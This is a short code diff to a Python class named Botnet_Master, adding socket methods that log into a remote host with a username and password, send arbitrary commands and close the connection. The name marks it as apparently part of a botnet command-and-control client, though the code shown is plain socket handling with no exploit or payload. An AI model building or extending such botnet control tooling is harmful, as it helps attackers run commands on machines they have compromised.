@@ -9,6 +9,31 @@ else:
 class Botnet_Master:
 
     @staticmethod
+    def send_data(data,sock,timeout=2,real_timeout=3):
+        sock.send('{}\n'.format(data).encode())
+        return Botnet_Master.read_data(sock,timeout=2,real_timeout=3)
+
+    
+    def login(self,host,port,username,password,timeout=3,read_timeout=2):
+        self.sock=socket.socket()
+        self.sock.settimeout(timeout)
+        self.sock.connect((host,port))
+        Botnet_Master.read_data(self.sock,timeout=read_timeout,real_timeout=timeout)
+        self.sock.send('{}\n'.format(username).encode())
+        Botnet_Master.read_data(self.sock,timeout=read_timeout,real_timeout=timeout)
+        self.sock.send('{}\n'.format(password).encode())
+        self.data=Botnet_Master.read_data(self.sock,timeout=read_timeout,real_timeout=timeout)
+        if 'failed' in self.data:
+            raise Exception('Login failed')
+
+    def execute(self,cmd,timeout=2,real_timeout=3):
+        return Botnet_Master.send_data(cmd,self.sock,timeout=2,real_timeout=3)
+    
+    def close(self):
+        self.sock.close()
+        self.sock=None
+
+    @staticmethod
     def read_data(sock,timeout=2,real_timeout=3):
         data=''
         sock.settimeout(timeout)
@@ -24,7 +49,7 @@ class Botnet_Master:
         return data
 
     @staticmethod
-    def connect(host,port,read_timeout=3,timeout=3):
+    def interact(host,port,read_timeout=3,timeout=3):
         s=socket.socket()
         s.settimeout(timeout)
         s.connect((host,port))
